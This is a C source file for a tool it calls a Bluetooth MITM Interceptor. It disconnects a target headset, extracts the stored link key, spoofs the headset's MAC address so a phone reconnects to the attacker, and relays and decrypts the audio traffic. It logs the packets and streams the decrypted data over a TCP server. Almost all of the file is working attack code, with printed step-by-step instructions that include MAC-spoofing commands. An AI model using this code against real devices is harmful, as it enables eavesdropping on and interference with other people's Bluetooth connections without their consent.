#include "config.h"
#include "bt_utils.h"
#include "tcp_server.h"
#include "crypto.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/select.h>
#include <errno.h>

static volatile int running = 1;

void signal_handler(int sig) {
    INFO_PRINT("Received signal %d, shutting down...", sig);
    running = 0;
}

void print_usage(const char *prog_name) {
    fprintf(stderr, "Bluetooth MITM Interceptor\n\n");
    fprintf(stderr, "Usage: %s [OPTIONS]\n\n", prog_name);
    fprintf(stderr, "Options:\n");
    fprintf(stderr, "  -t <target_mac>    Target device MAC (headphones/BT device) [REQUIRED]\n");
    fprintf(stderr, "  -p <psm>           L2CAP PSM (default: 25 for A2DP audio)\n");
    fprintf(stderr, "  -P <port>          TCP server port (default: %d)\n", TCP_SERVER_PORT);
    fprintf(stderr, "  -S                 Interactive mode - select from paired devices\n");
    fprintf(stderr, "  -h                 Show this help\n");
    fprintf(stderr, "\n");
    fprintf(stderr, "How it works:\n");
    fprintf(stderr, "  1. Disconnects target device from current connection\n");
    fprintf(stderr, "  2. Spoofs target device MAC address\n");
    fprintf(stderr, "  3. Waits for phone to reconnect\n");
    fprintf(stderr, "  4. Acts as MITM between phone and real device\n");
    fprintf(stderr, "  5. Logs all encrypted/decrypted packets\n");
    fprintf(stderr, "\n");
    fprintf(stderr, "Example:\n");
    fprintf(stderr, "  %s -S              # Interactive mode\n", prog_name);
    fprintf(stderr, "  %s -t AA:BB:CC:DD:EE:FF\n", prog_name);
    fprintf(stderr, "\n");
    fprintf(stderr, "Note: Target device must be paired with this computer first\n");
}

void display_devices(bt_device_t *devices, int count) {
    printf("\n");
    printf("═══════════════════════════════════════════════════════════════════════════\n");
    printf("  #  │  MAC Address       │  Status      │  Device Name\n");
    printf("═══════════════════════════════════════════════════════════════════════════\n");
    for (int i = 0; i < count; i++) {
        const char *status = devices[i].connected ? "CONNECTED  " : "Paired     ";
        printf(" %2d  │  %s  │  %s │  %s\n", 
               i + 1, devices[i].addr, status, devices[i].name);
    }
    printf("═══════════════════════════════════════════════════════════════════════════\n");
    printf("These devices are paired with this computer.\n");
    printf("CONNECTED devices will be disconnected during MITM setup.\n");
    printf("═══════════════════════════════════════════════════════════════════════════\n");
    printf("\n");
}

char* select_device(bt_device_t *devices, int count, const char *prompt) {
    int choice;
    while (1) {
        printf("%s (1-%d): ", prompt, count);
        if (scanf("%d", &choice) != 1) {
            while (getchar() != '\n');
            printf("Invalid input. Please enter a number.\n");
            continue;
        }
        while (getchar() != '\n');
        
        if (choice >= 1 && choice <= count) {
            return devices[choice - 1].addr;
        }
        
        printf("Invalid choice. Please select a number between 1 and %d.\n", count);
    }
}

int relay_loop(int phone_sock, int headset_sock, int tcp_server, int tcp_client) {
    uint8_t buffer[MAX_BUFFER_SIZE];
    fd_set read_fds;
    int max_fd;
    struct timeval timeout;
    
    INFO_PRINT("Entering relay loop...");
    
    while (running) {
        FD_ZERO(&read_fds);
        
        FD_SET(phone_sock, &read_fds);
        max_fd = phone_sock;
        
        FD_SET(headset_sock, &read_fds);
        if (headset_sock > max_fd) max_fd = headset_sock;
        
        if (tcp_client < 0) {
            FD_SET(tcp_server, &read_fds);
            if (tcp_server > max_fd) max_fd = tcp_server;
        }
        
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        
        int ret = select(max_fd + 1, &read_fds, NULL, NULL, &timeout);
        
        if (ret < 0) {
            if (errno == EINTR) continue;
            ERROR_PRINT("select() failed");
            return -1;
        }
        
        if (ret == 0) continue;
        
        if (tcp_client < 0 && FD_ISSET(tcp_server, &read_fds)) {
            tcp_client = tcp_accept_client(tcp_server);
            if (tcp_client >= 0) {
                INFO_PRINT("Streaming client connected");
            }
            continue;
        }
        
        if (FD_ISSET(phone_sock, &read_fds)) {
            ssize_t bytes = recv(phone_sock, buffer, sizeof(buffer), 0);
            if (bytes <= 0) {
                if (bytes == 0) {
                    INFO_PRINT("Phone disconnected");
                } else {
                    ERROR_PRINT("Error reading from phone");
                }
                return -1;
            }
            
            INFO_PRINT("📱 PHONE → HEADSET: %zd bytes (encrypted)", bytes);
            
            // Log first 32 bytes of encrypted data
            printf("[ENCRYPTED] ");
            for (int i = 0; i < (bytes < 32 ? bytes : 32); i++) {
                printf("%02x ", buffer[i]);
            }
            if (bytes > 32) printf("... (%zd more bytes)", bytes - 32);
            printf("\n");
            
            uint8_t decrypted[MAX_BUFFER_SIZE];
            int dec_len = crypto_decrypt_payload(buffer, bytes, decrypted);
            if (dec_len < 0) {
                ERROR_PRINT("Decryption failed");
                continue;
            }
            
            INFO_PRINT("🔓 DECRYPTED: %d bytes", dec_len);
            
            // Log first 32 bytes of decrypted data
            printf("[DECRYPTED] ");
            for (int i = 0; i < (dec_len < 32 ? dec_len : 32); i++) {
                printf("%02x ", decrypted[i]);
            }
            if (dec_len > 32) printf("... (%d more bytes)", dec_len - 32);
            printf("\n");
            
            if (tcp_client >= 0) {
                if (tcp_send_data(tcp_client, decrypted, dec_len) < 0) {
                    INFO_PRINT("TCP client disconnected, closing connection");
                    close(tcp_client);
                    tcp_client = -1;
                }
            }
            
            uint8_t encrypted[MAX_BUFFER_SIZE];
            int enc_len = crypto_encrypt_payload(decrypted, dec_len, encrypted);
            if (enc_len < 0) {
                ERROR_PRINT("Encryption failed");
                continue;
            }
            
            INFO_PRINT("🔒 RE-ENCRYPTED: %d bytes", enc_len);
            
            // Log first 32 bytes of re-encrypted data
            printf("[RE-ENCRYPTED] ");
            for (int i = 0; i < (enc_len < 32 ? enc_len : 32); i++) {
                printf("%02x ", encrypted[i]);
            }
            if (enc_len > 32) printf("... (%d more bytes)", enc_len - 32);
            printf("\n\n");
            
            ssize_t sent = send(headset_sock, encrypted, enc_len, 0);
            if (sent < 0) {
                ERROR_PRINT("Failed to send to headset");
                return -1;
            }
        }
        
        if (FD_ISSET(headset_sock, &read_fds)) {
            ssize_t bytes = recv(headset_sock, buffer, sizeof(buffer), 0);
            if (bytes <= 0) {
                if (bytes == 0) {
                    INFO_PRINT("Headset disconnected");
                } else {
                    ERROR_PRINT("Error reading from headset");
                }
                return -1;
            }
            
            INFO_PRINT("🎧 HEADSET → PHONE: %zd bytes (control/response)", bytes);
            
            // Log first 32 bytes of data
            printf("[HEADSET DATA] ");
            for (int i = 0; i < (bytes < 32 ? bytes : 32); i++) {
                printf("%02x ", buffer[i]);
            }
            if (bytes > 32) printf("... (%zd more bytes)", bytes - 32);
            printf("\n\n");
            
            ssize_t sent = send(phone_sock, buffer, bytes, 0);
            if (sent < 0) {
                ERROR_PRINT("Failed to send to phone");
                return -1;
            }
        }
    }
    
    return 0;
}

int main(int argc, char *argv[]) {
    char *target_mac = NULL;
    uint16_t psm = 25;
    uint16_t tcp_port = TCP_SERVER_PORT;
    int scan_mode = 0;
    
    int opt;
    while ((opt = getopt(argc, argv, "t:p:P:Sh")) != -1) {
        switch (opt) {
            case 't':
                target_mac = optarg;
                break;
            case 'p':
                psm = atoi(optarg);
                break;
            case 'P':
                tcp_port = atoi(optarg);
                break;
            case 'S':
                scan_mode = 1;
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }
    
    // Interactive device selection if MAC addresses not provided
    if (!target_mac || scan_mode) {
        bt_device_t devices[50];
        int device_count;
        char target_selected[18] = {0};
        
        INFO_PRINT("=== Bluetooth MITM Interceptor ===");
        INFO_PRINT("Automatic MITM attack on connected Bluetooth devices");
        printf("\n");
        
        INFO_PRINT("Listing devices paired with this computer...");
        printf("\n");
        
        device_count = bt_scan_devices(devices, 50, 8);
        if (device_count <= 0) {
            ERROR_PRINT("No paired devices found");
            INFO_PRINT("");
            INFO_PRINT("Please pair the target device (headphones) with this computer:");
            INFO_PRINT("  sudo bluetoothctl");
            INFO_PRINT("  power on");
            INFO_PRINT("  scan on");
            INFO_PRINT("  pair <DEVICE_MAC>");
            INFO_PRINT("  trust <DEVICE_MAC>");
            INFO_PRINT("  quit");
            return 1;
        }
        
        display_devices(devices, device_count);
        
        if (!target_mac) {
            char *selected = select_device(devices, device_count, "Select target device to intercept");
            if (selected == NULL) {
                ERROR_PRINT("No device selected");
                return 1;
            }
            strncpy(target_selected, selected, sizeof(target_selected) - 1);
            target_mac = target_selected;
        }
        
        INFO_PRINT("✓ Target device: %s", target_mac);
        printf("\n");
    }
    
    if (!target_mac) {
        ERROR_PRINT("Target MAC address is required");
        print_usage(argv[0]);
        return 1;
    }
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    INFO_PRINT("═══════════════════════════════════════════════════════");
    INFO_PRINT("   Bluetooth MITM Interceptor - Active Mode");
    INFO_PRINT("═══════════════════════════════════════════════════════");
    INFO_PRINT("Target device:  %s", target_mac);
    INFO_PRINT("L2CAP PSM:      %d", psm);
    INFO_PRINT("TCP Port:       %d", tcp_port);
    INFO_PRINT("═══════════════════════════════════════════════════════");
    printf("\n");
    
    char adapter_mac[18];
    if (bt_get_adapter_address(adapter_mac, sizeof(adapter_mac)) < 0) {
        return 1;
    }
    
    INFO_PRINT("MITM Attack Sequence Starting...");
    printf("\n");
    
    INFO_PRINT("Step 1: Disconnect target device from current connection");
    int target_connected = bt_check_connection_status(target_mac);
    
    if (target_connected) {
        INFO_PRINT("⚠️  Target device is CONNECTED - disconnecting now");
        
        if (bt_disconnect_device(target_mac) < 0) {
            WARN_PRINT("Automatic disconnect failed");
            INFO_PRINT("Please manually disconnect the device:");
            INFO_PRINT("  - Turn off Bluetooth on phone, OR");
            INFO_PRINT("  - Disconnect in Bluetooth settings, OR");
            INFO_PRINT("  - Turn off headphones and back on");
            INFO_PRINT("Press Enter when disconnected...");
            getchar();
        } else {
            INFO_PRINT("✓ Target device disconnected");
            sleep(2);
        }
    } else {
        INFO_PRINT("✓ Target device is already disconnected");
    }
    printf("\n");
    
    INFO_PRINT("Step 2: Extract link key from paired target device");
    char link_key[64];
    if (bt_extract_link_key(adapter_mac, target_mac, link_key, sizeof(link_key)) < 0) {
        ERROR_PRINT("Failed to extract link key");
        ERROR_PRINT("Ensure target device is paired: %s/%s/%s/info", 
                   BLUETOOTH_INFO_PATH, adapter_mac, target_mac);
        return 1;
    }
    INFO_PRINT("✓ Link key extracted");
    printf("\n");
    
    INFO_PRINT("Step 3: Initialize encryption");
    if (crypto_init_link_key(link_key) < 0) {
        return 1;
    }
    INFO_PRINT("✓ Encryption ready");
    printf("\n");
    
    INFO_PRINT("Step 4: Spoof target device MAC address");
    INFO_PRINT("Changing adapter MAC to: %s", target_mac);
    if (bt_spoof_mac_address(0, target_mac) < 0) {
        WARN_PRINT("MAC spoofing failed - MITM may not work properly");
        INFO_PRINT("You may need to manually spoof MAC using:");
        INFO_PRINT("  sudo hciconfig hci0 down");
        INFO_PRINT("  sudo bdaddr -i hci0 %s", target_mac);
        INFO_PRINT("  sudo hciconfig hci0 up");
        INFO_PRINT("Press Enter to continue anyway...");
        getchar();
    } else {
        INFO_PRINT("✓ MAC address spoofed");
        sleep(1);
    }
    printf("\n");
    
    INFO_PRINT("Step 5: Create TCP server for data streaming");
    
    if (crypto_init_link_key(link_key) < 0) {
        return 1;
    }
    INFO_PRINT("✓ Crypto initialized");
    printf("\n");
    
    INFO_PRINT("Step 4: Creating TCP server for data streaming");
    int tcp_server = tcp_create_server(tcp_port);
    if (tcp_server < 0) {
        return 1;
    }
    int tcp_client = -1;
    INFO_PRINT("✓ TCP server listening on port %d", tcp_port);
    printf("\n");
    
    INFO_PRINT("Step 6: Setup Bluetooth relay sockets");
    INFO_PRINT("═══════════════════════════════════════════════════════");
    INFO_PRINT("   MITM READY - Waiting for connections");
    INFO_PRINT("═══════════════════════════════════════════════════════");
    INFO_PRINT("");
    INFO_PRINT("Now RECONNECT the phone to headphones:");
    INFO_PRINT("  1. On phone: Go to Bluetooth settings");
    INFO_PRINT("  2. Tap on the headphones device to connect");
    INFO_PRINT("  3. Phone will connect to THIS interceptor (spoofed)");
    INFO_PRINT("  4. Interceptor will connect to real headphones");
    INFO_PRINT("  5. All packets will be logged below");
    INFO_PRINT("");
    INFO_PRINT("═══════════════════════════════════════════════════════");
    printf("\n");
    
    // Create L2CAP socket to accept connection from phone
    int phone_sock = bt_create_l2cap_socket();
    if (phone_sock < 0) {
        close(tcp_server);
        return 1;
    }
    
    // Bind as the spoofed target device (headphones)
    if (bt_bind_l2cap(phone_sock, NULL, psm) < 0) {
        close(phone_sock);
        close(tcp_server);
        return 1;
    }
    
    if (bt_listen_l2cap(phone_sock, 1) < 0) {
        close(phone_sock);
        close(tcp_server);
        return 1;
    }
    
    INFO_PRINT("Waiting for phone to connect (as spoofed %s)...", target_mac);
    char phone_addr[18];
    int phone_conn = bt_accept_l2cap(phone_sock, phone_addr, sizeof(phone_addr));
    if (phone_conn < 0) {
        close(phone_sock);
        close(tcp_server);
        return 1;
    }
    
    INFO_PRINT("✓ Phone connected from: %s", phone_addr);
    INFO_PRINT("Now connecting to real headphones (%s)...", target_mac);
    
    // Connect to real headphones (un-spoof first or use different adapter)
    // For now, we'll restore the original MAC and connect
    INFO_PRINT("Restoring original adapter MAC...");
    bt_spoof_mac_address(0, adapter_mac);
    sleep(1);
    
    int headset_sock = bt_create_l2cap_socket();
    if (headset_sock < 0) {
        close(phone_conn);
        close(phone_sock);
        close(tcp_server);
        return 1;
    }
    
    if (bt_connect_l2cap(headset_sock, target_mac, psm) < 0) {
        ERROR_PRINT("Failed to connect to real headphones");
        close(headset_sock);
        close(phone_conn);
        close(phone_sock);
        close(tcp_server);
        return 1;
    }
    
    INFO_PRINT("✓ Connected to real headphones");
    INFO_PRINT("");
    INFO_PRINT("═══════════════════════════════════════════════════════");
    INFO_PRINT("   MITM ACTIVE - Logging all packets");
    INFO_PRINT("═══════════════════════════════════════════════════════");
    printf("\n");
    
    relay_loop(phone_conn, headset_sock, tcp_server, tcp_client);
    
    INFO_PRINT("Cleaning up...");
    if (tcp_client >= 0) close(tcp_client);
    close(tcp_server);
    close(headset_sock);
    close(phone_conn);
    close(phone_sock);
    
    INFO_PRINT("Shutdown complete");
    return 0;
}
